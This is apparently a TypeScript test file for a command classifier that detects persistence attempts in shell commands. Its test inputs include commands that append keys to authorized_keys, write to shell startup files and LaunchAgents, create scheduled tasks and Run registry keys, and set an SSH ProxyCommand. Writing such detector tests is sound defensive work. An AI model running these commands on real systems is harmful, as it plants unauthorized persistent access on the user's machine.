import { describe, expect, it } from 'vitest';
import { classifyCommand } from '../../src/actions/classify-bash.js';
import {
  commandWrittenFiles,
  isPersistencePath,
  persistenceSignals,
} from '../../src/actions/persistence.js';
import { splitCommand } from '../../src/actions/shell-segments.js';

const cwd = '/home/dev/project';
const persists = (command: string) =>
  classifyCommand(command, cwd).classes.includes('config.persistence');

describe('a relative name is joined to the directory an earlier cd moved into', () => {
  it.each([
    'cd ~/.ssh && echo k >> authorized_keys',
    'cd ~/.ssh; cat key.pub >> authorized_keys',
    'cd ~/Library/LaunchAgents && cat > x.plist',
    '(cd ~/.ssh && echo k >> authorized_keys)',
    '{ cd ~/.ssh; echo k >> authorized_keys; }',
    'pushd ~/.config/autostart && tee x.desktop',
    'cd "$HOME/.ssh" && echo k >> authorized_keys',
  ])('%s', (command) => {
    expect(persists(command)).toBe(true);
  });

  it.each([
    'cd ~/project && echo x >> notes.txt',
    'cd ~/.ssh && cat authorized_keys',
    'cd ~/.ssh && grep k authorized_keys',
    'cd ~/.ssh && ls',
    'echo k >> authorized_keys',
  ])('leaves %s alone', (command) => {
    expect(persists(command)).toBe(false);
  });
});

describe('the other ways to put something where it runs later', () => {
  it.each([
    'defaults write ~/Library/LaunchAgents/com.example.plist RunAtLoad -bool true',
    '/usr/libexec/PlistBuddy -c "Add :Label string x" ~/Library/LaunchAgents/x.plist',
    'echo x | dd of=~/.zshrc',
    'dd if=payload of=$HOME/.bashrc',
    'git clone https://example.com/x.git ~/.config/autostart',
    'tar -xf payload.tar -C ~/Library/LaunchAgents',
    'tar -xf payload.tar --directory=~/.config/autostart',
    'unzip payload.zip -d ~/.config/systemd/user',
    'tee ~/.{zshrc,bashrc} < payload',
    'echo x | tee -a ~/.zshrc ~/.bashrc',
    `python3.12 -c "open('/Users/a/.zshrc','a').write('x')"`,
    `python3.11 -c "import shutil; shutil.copy('x', '/Users/a/.zshrc')"`,
    `perl -e 'open(F, ">>", "/Users/a/.bashrc"); print F "x"'`,
    `ruby -e "File.write('/Users/a/.zshrc', 'x')"`,
    `node22 -e "require('fs').writeFileSync('/Users/a/.zshrc','x')"`,
    'echo x >> ~/.bash_aliases',
    'echo x >> /etc/bashrc',
    'echo x >> ~/.config/fish/functions/fish_prompt.fish',
    'echo x >> ~/.config/environment.d/x.conf',
  ])('%s', (command) => {
    expect(persists(command)).toBe(true);
  });

  it.each([
    'launchctl submit -l x -- /bin/sh -c id',
    'launchctl bootstrap gui/501 ~/Library/LaunchAgents/x.plist',
    'systemd-run --user --on-calendar=daily /bin/true',
    'systemd-run --on-boot=1min /bin/true',
    'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v x /d calc.exe',
    'powershell -Command "Register-ScheduledTask -TaskName x -Action $a"',
  ])('schedules a job: %s', (command) => {
    expect(persistenceSignals(splitCommand(command).segments, command)).toContain(
      'scheduled-task-create',
    );
  });

  it.each([
    'defaults read ~/Library/LaunchAgents/x',
    'defaults write com.apple.finder AppleShowAllFiles true',
    'launchctl list',
    'launchctl load ~/Library/LaunchAgents/x.plist',
    'systemd-run --user /bin/true',
    'reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
    'tar -xf payload.tar -C /tmp/x',
    'unzip payload.zip -d build',
    'git clone https://example.com/x.git ~/code/x',
    'dd if=/dev/zero of=/tmp/file bs=1M count=1',
    `python3.12 -c "print(open('/Users/a/.zshrc').read())"`,
    `ruby -e "puts File.read('/Users/a/.zshrc')"`,
  ])('leaves %s alone', (command) => {
    expect(persists(command)).toBe(false);
  });
});

describe('the files themselves', () => {
  it.each([
    '/home/dev/.bash_aliases',
    '/etc/bashrc',
    '/etc/zprofile',
    '/home/dev/.config/fish/functions/x.fish',
    '/home/dev/.config/environment.d/x.conf',
    '/home/dev/.pam_environment',
  ])('names %s', (path) => {
    expect(isPersistencePath(path)).toBe(true);
  });

  it.each([
    '/etc/cron.d/x',
    '/etc/systemd/system/x.service',
    '/home/dev/.bash_aliases.bak',
    '/home/dev/project/bash_aliases.md',
  ])('leaves %s to the administrator', (path) => {
    expect(isPersistencePath(path)).toBe(false);
  });
});

describe('ssh client configuration', () => {
  it('reads a directive written to a drop-in under config.d', () => {
    expect(persists('echo "ProxyCommand sh -c id" >> ~/.ssh/config.d/x')).toBe(true);
    expect(persists('echo "Host x" >> ~/.ssh/config.d/x')).toBe(false);
  });
});

describe('commandWrittenFiles', () => {
  it('lists each file once, as spelled and as a cd resolves it', () => {
    const segments = splitCommand(
      'cd ~/.ssh && echo a >> authorized_keys && echo b >> authorized_keys',
    ).segments;
    expect(commandWrittenFiles(segments)).toEqual(['authorized_keys', '~/.ssh/authorized_keys']);
  });

  it('lists every written file, with no cap for a decoy to hide behind, and no repeats', () => {
    const many = Array.from({ length: 200 }, (_, i) => `echo x > f${i % 150}`).join('\n');
    expect(commandWrittenFiles(splitCommand(many).segments)).toHaveLength(150);
  });

  it('expands braces a few levels deep and no further', () => {
    const files = commandWrittenFiles(splitCommand('tee ~/.{zshrc,bashrc,profile}').segments);
    expect(files).toEqual(expect.arrayContaining(['~/.zshrc', '~/.bashrc', '~/.profile']));
    const nested = `tee ${'{a,b}'.repeat(30)}`;
    expect(() => commandWrittenFiles(splitCommand(nested).segments)).not.toThrow();
    expect(commandWrittenFiles(splitCommand(nested).segments).length).toBeLessThanOrEqual(16);
  });
});
